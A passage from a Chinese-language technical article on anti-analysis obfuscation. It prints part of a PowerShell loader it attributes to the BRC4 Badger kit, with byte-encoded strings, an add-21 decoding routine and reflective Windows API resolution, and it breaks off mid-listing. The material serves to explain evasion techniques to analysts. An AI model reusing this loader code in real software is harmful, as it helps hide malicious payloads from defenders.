的所有名称）。这些有意义的名称会为逆向分析提供便利。因此，为了对抗分析，开发者会<strong>混淆或剥离（Strip）</strong>这些可识别信息，以防止它们暴露程序的原始功能。</p><p>作为解释型语言的一个例子，我们可以观察 BRC4 社区套件中已弃用的 Badger PowerShell 加载器。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">Set-StrictMode</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Version </span><span style="color: #D19A66">2</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Ait1m</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x3d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x51</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$ahv3I</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x34</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x58</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Moo5y</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$ooR5o</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x2e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Reo5o</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x3d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x58</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Reib3</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x3d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x39</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x58</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x33</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Thah8</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x33</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x64</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x52</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x39</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x62</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x17</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x0b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x41</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$ii5Ie</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x34</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x61</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x56</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$KooG5</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x51</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x19</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x42</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x19</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x40</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x51</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x39</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x61</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x53</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$io9iH</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x32</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5e</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$Qui5i</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x32</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x38</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x33</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$xee2N</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x56</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x59</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x1d</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$AD0Pi</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x41</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x2c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$ahb3O</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x41</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x54</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x60</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4c</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x57</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3b</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5d</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5a</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4e</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5f</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #C678DD">Byte</span><span style="color: #ABB2BF">[]] </span><span style="color: #E06C75">$yhe4c</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">@</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">0x2E</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5D</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4C</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5F</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x3F</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x53</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x5D</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x50</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4C</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0x4F</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Get-Robf</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$b3tz</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$aisN</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">System.Byte</span><span style="color: #ABB2BF">[]]::new(</span><span style="color: #E06C75">$b3tz.Count</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$x</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">$x</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-lt</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$aisN.Count</span><span style="color: #ABB2BF">; </span><span style="color: #E06C75">$x</span><span style="color: #56B6C2">++</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">       </span><span style="color: #E06C75">$aisN</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$x</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$b3tz</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$x</span><span style="color: #ABB2BF">] </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">21</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> [</span><span style="color: #C678DD">System.Text.Encoding</span><span style="color: #ABB2BF">]::ASCII.GetString(</span><span style="color: #E06C75">$aisN</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Get-PA</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$vmod</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$vproc</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #E06C75">$a</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> ([</span><span style="color: #C678DD">AppDomain</span><span style="color: #ABB2BF">]::CurrentDomain.GetAssemblies() | </span><span style="color: #56B6C2">Where-Object</span><span style="color: #ABB2BF"> { $_</span><span style="color: #E06C75">.GlobalAssemblyCache</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-And</span><span style="color: #ABB2BF"> $_</span><span style="color: #E06C75">.Location.Split</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;\\\\&#39;</span><span style="color: #ABB2BF">)[</span><span style="color: #D19A66">-1</span><span style="color: #ABB2BF">].Equals(</span><span style="color: #98C379">&#39;System.dll&#39;</span><span style="color: #ABB2BF">) }).GetType((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$KooG5</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> (</span><span style="color: #E06C75">$a.GetMethod</span><span style="color: #ABB2BF">((</span><span style="color: #56B6C2">Get-Robf</span><span style="color: #ABB2BF"> </span><span style="color: 